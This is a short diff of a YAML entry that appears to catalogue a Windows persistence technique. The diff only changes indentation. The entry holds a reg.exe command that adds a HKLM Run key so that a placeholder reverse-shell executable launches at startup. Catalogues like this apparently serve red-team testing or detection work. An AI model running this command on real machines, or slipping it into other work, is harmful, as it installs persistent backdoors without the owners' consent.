@@ -8,9 +8,9 @@ description: |
 
   	RegKey data type: /t REG_SZ
     
-    Data: /d "C:\Path\To\revshell.exe"
+  	Data: /d "C:\Path\To\revshell.exe"
 
-    KeyName: "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" 
+  	KeyName: "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" 
 
 command: |
    reg.exe add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v Persistence /t REG_SZ /d "C:\Path\To\revshell.exe"
